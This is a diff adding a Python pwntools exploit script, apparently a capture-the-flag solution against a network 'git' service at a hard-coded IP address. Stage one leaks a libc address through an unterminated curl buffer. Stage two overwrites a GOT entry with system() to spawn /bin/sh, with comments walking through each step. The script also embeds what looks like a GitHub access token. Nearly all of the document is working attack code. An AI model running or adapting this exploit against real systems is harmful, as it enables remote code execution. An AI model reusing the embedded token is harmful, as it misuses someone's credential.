@@ -1,0 +1,138 @@
+#!/usr/bin/python3
+
+from pwn import *
+
+exe = ELF('git', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+sln = lambda msg, num: sla(msg, str(num).encode())
+sn = lambda msg, num: sa(msg, str(num).encode())
+
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+        set follow-fork-mode parent
+        set solib-search-path /home/as/kcsc/gittools/share/solves/git/solution
+        b*changedir+435
+        c
+        ''')
+        input()
+
+def exploit(filename):
+    global p
+    i = 0
+    while True:
+        # if args.REMOTE:
+        # p = remote('0', 9001)
+        # else:
+        p = remote("157.15.86.73",  9001)
+        # p = process(exe.path)
+
+        sla(b'> ', b'token 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')
+        sla(b'> ', b'repo antkss/lmao')
+        res = p.recvline(timeout=5)
+        if b'Request timeout' in res:
+            p.close()
+            continue
+
+        ##################################
+        ### Stage 1: Leak libc address ###
+        ##################################
+        note = '''
+        Idea is to `cat <FILE>` to leak libc main arena because curl_callback doesn't add null byte
+        Local:  file 0x618 bytes to concate with main arena
+        Docker: file 0x5e8 bytes to concate with main arena
+        --> Format 0x558+i*0x10 bytes, start from 0x558 because less byte doesn't reach main arena address
+
+        There are files uploaded to github support this attack, each file has number of bytes same as its name, such as file "558" has 0x558 bytes
+        .
+        ├── 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+        ├── 558
+        ├── 568
+        ├── 578
+        ├── 588
+        ├── 598
+        ├── 5a8
+        ├── 5b8
+        ├── 5c8
+        ├── 5d8
+        ├── 5e8
+        └── 5f8
+
+        When curl, receive packet can be different from size, like we can receive 2 packet with size 0x301 and 0x257 or 0x289 and 0x2fc
+        --> Loop 5 times for each pattern to make sure we don't miss any pattern
+
+        After test with local and docker, both has same format between leaked address and base address:
+        libc.address = (libc_leak & 0xfffffffffffff000) - 0x1ec000
+        '''
+
+        sla(b'> ', f'cat {filename}'.encode())
+        res = p.recvuntil(b'C'*8, timeout=5)                               # my files has 8 bytes "C" at the end so it's easier to check
+        if not res:
+            p.close()
+            continue
+        try:
+            libc_leak = u64(p.recv(6) + b'\0\0')
+            libc.address = (libc_leak & 0xfffffffffffff000) - 0x1ec000          # leaked addresses are from main arena so the difference is just offset
+            log.info(f"debug: {hex(libc_leak)}")
+        except:
+            p.close()
+            continue
+
+        info("Libc leak: " + hex(libc_leak))
+        info("Libc base: " + hex(libc.address))
+
+        if (libc.address & 0xfff or libc.address >> 40 != 0x7f):
+            log.critical("Invalid libc base!")
+            p.close()
+            if i==5:
+                return
+            i+=1
+            continue
+        break
+
+    ##########################
+    ### Stage 2: Get shell ###
+    ##########################
+    note = '''
+    If we can jump into changedir(".."), rdi is under control. But when libc address, byte \x7f is bad format for curl and we cannot control rdi
+    --> We cannot execute system("/bin/sh") directly, there have to be someway
+
+    Trying to write one_gadget to saved rip of changedir but rdx is 1 --> Failed
+
+    Trying to write one_gadget to _rtld_global+3848
+    _rtld_global offset: 0x2d7060
+    But _rtld_global in ld and we just have libc --> Hard, offset is dynamic, maybe need to bruteforce
+
+    Trying to write system to __strlen_avx2@got of puts, meanwhile snprintf also use __strlen_avx2 and we execute readfile
+    with rdi is REPONAME --> Get shell
+    '''
+
+    info("System: " + hex(libc.sym.system))
+    info("Libc GOT: " + hex(libc.address + 0x1ec0a8 + 0x100))
+    # GDB()
+    sla(b'> ', b'cd 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
+    payload = flat(
+        {
+            150: b';/bin/sh;',                                                      # Prepare /bin/sh string for snprintf of readfile
+            164: libc.address + 0x1ec0a8 + 0x100,
+        },
+        )
+    sla(b'> ', b'cd ' + payload)
+    sla(b'> ', b'cat deadbeef'.ljust(0x20, b'\0') + p64(libc.sym.system))           # Overwrite __strlen_avx2@got into system
+
+    p.interactive()
+
+p = None
+if __name__=='__main__':
+    exploit(hex(0x598))               # This offset is correct
+    # for i in range(100):
+    #     exploit(hex(0x558 + i*0x10))
+
